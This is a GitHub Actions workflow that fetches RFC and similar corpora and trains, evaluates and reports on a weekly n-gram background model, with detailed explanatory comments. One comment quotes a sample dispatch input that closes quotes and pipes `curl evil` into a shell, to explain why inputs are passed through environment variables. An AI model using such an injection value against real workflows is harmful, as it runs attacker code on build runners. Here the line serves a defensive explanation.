name: train
# The background model, rebuilt weekly from the document libraries in analysis/corpora.yaml.
#
# Scheduled rather than on push because the input that changes is the corpus, not the code. A
# training run on every commit would rebuild an identical model from an identical library and
# spend half an hour doing it.
#
# The model is a build artifact and is never committed. It is uploaded, kept for a quarter, and
# compared against the previous run's record. Committing it would put a 100MB binary in the
# history of a repository whose entire product is 40KB of YAML.
on:
  schedule:
    - cron: "17 4 * * 0"
  workflow_dispatch:
    inputs:
      order:
        description: n-gram order
        default: "4"
      max_seconds:
        description: wall-clock ceiling, seconds (the governor's limit is 1800)
        default: "1500"
      corpus_size:
        description: how many RFCs to hold, spread across the published range
        # 1500 rather than the whole archive: at order 4 the table costs about 250MB per million
        # tokens and 1500 RFCs is roughly 17M tokens, which lands under the governor's 5120MB with
        # margin. Above that the resident-set ceiling binds and the model describes a prefix.
        default: "1500"

permissions:
  contents: read

concurrency:
  group: train
  cancel-in-progress: false

jobs:
  train:
    runs-on: ubuntu-latest
    # Twice the trainer's own wall-clock ceiling. The Budget is what stops training; this is only
    # here so a hang in the report step cannot hold a runner for six hours.
    timeout-minutes: 60
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: "3.11"
      - run: pip install -e '.[dev]'
        working-directory: analysis

      # A model of a corpus the tests never exercised is not worth training. This is the same
      # suite test.yml runs; it is repeated here because a scheduled job that assumes the last
      # push was green will happily train on a broken loader for a month.
      - run: pytest
        working-directory: analysis

      # The corpus is cached across runs, so the first weekly job pays for the download and the
      # rest top it up. The fetcher skips what is already on disk, which is what makes a partial
      # cache useful rather than a reason to start over.
      - uses: actions/cache@v4
        with:
          path: analysis/corpora
          # v2: v1 caches hold the old `corpora/rfc/rfc/*.txt` layout, which corpora.yaml does not
          # read. Restoring one would put the job straight back into training on repository prose.
          key: corpus-v2-${{ github.event.inputs.corpus_size || 1500 }}
          restore-keys: corpus-v2-

      # The only network access in this repository, and every part of it is constrained: https
      # only, an allowlist of URL prefixes rather than hosts, text/plain only, and a refusal list of
      # the extensions a set of weights arrives in. test/boundary.test.ts pins all four.
      #
      # `--out corpora`, not `corpora/rfc`. The fetcher treats --out as the parent and gives each
      # source its own subdirectory, so `--out corpora/rfc` writes `corpora/rfc/rfc/*.txt` while
      # corpora.yaml reads `corpora/rfc/*.txt`. Every third-party entry in that manifest is
      # `required: false`, so nothing would have failed: the loader shrugs and the job trains on
      # ~250KB of repository prose. This workflow had not yet fired once, so no model was actually
      # built that way — the bug was found by reading, not by a bad artifact. The step below is what
      # keeps it found.
      #
      # Inputs reach the shell through `env:`, never interpolated into the script. A dispatch input
      # of `1500" ; curl evil | sh ; echo "` closes the quotes in a `${{ }}` substitution and runs;
      # `$CORPUS_SIZE` is a shell variable and cannot. Dispatch needs write access, so this is not
      # reachable by a stranger — it is the pattern that stops being safe the day the trigger widens.
      - name: fetch corpus
        working-directory: analysis
        env:
          CORPUS_SIZE: ${{ github.event.inputs.corpus_size || 1500 }}
        run: |
          python scripts/fetch_corpus.py \
            --out corpora \
            --limit "$CORPUS_SIZE" \
            --delay 0.25

      # A path bug upstream of a `required: false` corpus is invisible: training succeeds, the
      # record looks plausible, and the model describes the repository's own docs. Fail here
      # instead, before half an hour of compute goes into a model of nothing.
      - name: the fetched corpus reaches the trainer
        working-directory: analysis
        run: |
          python - <<'PY'
          from adhd_analysis.text.corpora import Library
          described = {s["name"]: s for s in Library.load("corpora.yaml").describe()}
          fetched = {n: d for n, d in described.items() if n in {"rfc", "pep", "eip", "erc"}}
          for name, d in fetched.items():
              print(f"{name:6} {d['files']:6} files {d['bytes']:12,} bytes")
          total = sum(d["bytes"] for d in fetched.values())
          if total < 10_000_000:
              raise SystemExit(
                  f"the fetched corpus is {total:,} bytes, which is repository prose and not a "
                  "background corpus. The fetch step wrote somewhere corpora.yaml does not read."
              )
          PY

      # `--held-out-every 20` trains on nineteen documents in twenty and leaves the twentieth for the
      # step below. Without it this trained on the whole manifest and the next step scored one
      # document in twenty of that same manifest, which is a memorisation score wearing the name
      # "held-out perplexity". On the real corpus that was off by a factor of four. D16 has the
      # measurement; `evaluate` refuses the combination outright now, so this flag is not a
      # preference — the job fails without it.
      #
      # The shipped model therefore trains on 95% of the corpus. That is the price of the reported
      # number meaning what it says, and at 68M tokens the 5% is worth far less than the honesty.
      - name: train
        working-directory: analysis
        env:
          ORDER: ${{ github.event.inputs.order || 4 }}
          MAX_SECONDS: ${{ github.event.inputs.max_seconds || 1500 }}
        run: |
          python -m adhd_analysis.text.train \
            --manifest corpora.yaml \
            --out models/background.kn.gz \
            --record models/training-record.json \
            --order "$ORDER" \
            --max-seconds "$MAX_SECONDS" \
            --held-out-every 20 \
            --min-count 2

      # `vocab_truncated` is nonzero when --max-vocab cut types that met --min-count. That raises the
      # OOV rate for a reason the rate itself cannot show, and it makes this week's perplexity
      # incomparable with last week's. A warning rather than a failure: a capped vocabulary is a
      # usable model, it just is not a comparable one.
      - name: say whether the vocabulary ceiling bound
        working-directory: analysis
        run: |
          python - <<'PY'
          import json
          cut = json.load(open("models/training-record.json"))["vocab_truncated"]
          if cut["types"]:
              print(f"::warning::the vocabulary ceiling cut {cut['types']:,} types "
                    f"({cut['tokens']:,} tokens) that met min_count. This week's perplexity is not "
                    "comparable with a run whose vocabulary was not capped.")
          else:
              print("the vocabulary ceiling did not bind")
          PY

      # Held-out perplexity, which is the only number in the record that can get worse. Vocabulary
      # size, n-gram count and wall clock all rise when the model degrades, so a weekly job that
      # reported only those would call a memorised corpus an improvement.
      - name: held-out perplexity
        working-directory: analysis
        run: |
          python - <<'PY' | tee models/heldout.json
          import json
          from adhd_analysis.text.budget import Budget
          from adhd_analysis.text.corpora import Library
          from adhd_analysis.text.evaluate import SplitLibrary, evaluate
          from adhd_analysis.text.ngram import KneserNey

          model = KneserNey.load("models/background.kn.gz")
          held = SplitLibrary(Library.load("corpora.yaml"), every=20, side="heldout")
          # `evaluate` raises if the model trained on this text. The stride here has to match the
          # trainer's `--held-out-every` and the side has to be the other one; anything else is a
          # failed job rather than a number.
          print(json.dumps(vars(evaluate(model, held, Budget.weekly())), indent=2))
          PY

      - name: report
        working-directory: analysis
        run: |
          python -m adhd_analysis --root .. --model models/background.kn.gz > models/report.txt
          {
            echo '## Background model'
            echo '```json'
            python -c "import json;d=json.load(open('models/training-record.json'));print(json.dumps({k:d[k] for k in ('order','vocab_size','documents','sentences','tokens_seen','ngrams','oov_rate','seconds')},indent=2))"
            echo '```'
            echo '<details><summary>ceilings and whether any bit</summary>'; echo
            echo '```json'; python -c "import json;print(json.dumps(json.load(open('models/training-record.json'))['budget'],indent=2))"; echo '```'
            echo '</details>'
            echo '<details><summary>genericity against the recorded corpus</summary>'; echo
            echo '```'; sed -n '/## Genericity/,$p' models/report.txt; echo '```'
            echo '</details>'
          } >> "$GITHUB_STEP_SUMMARY"

      # A ceiling that bit is not a failure and must not be one: the model is a legitimate model of
      # a truncated corpus. It is worth surfacing, because the fix is the governor's call and
      # nobody reads a step summary that never says anything.
      - name: flag a ceiling that bit
        working-directory: analysis
        run: |
          python - <<'PY' >> "$GITHUB_STEP_SUMMARY"
          import json
          b = json.load(open("models/training-record.json"))["budget"]
          hit = {k: v["stopped_because"] for k, v in b.items() if v["stopped_because"]}
          print("\n> **A ceiling bit.** " + "; ".join(f"{k}: {v}" for k, v in hit.items()) +
                "\n> The model describes the prefix it read. Ask adhd-governor whether to raise it."
                if hit else "\n> No ceiling bit: the model saw the whole library.")
          PY

      - uses: actions/upload-artifact@v4
        with:
          name: background-model
          path: |
            analysis/models/background.kn.gz
            analysis/models/training-record.json
            analysis/models/heldout.json
            analysis/models/report.txt
          retention-days: 90
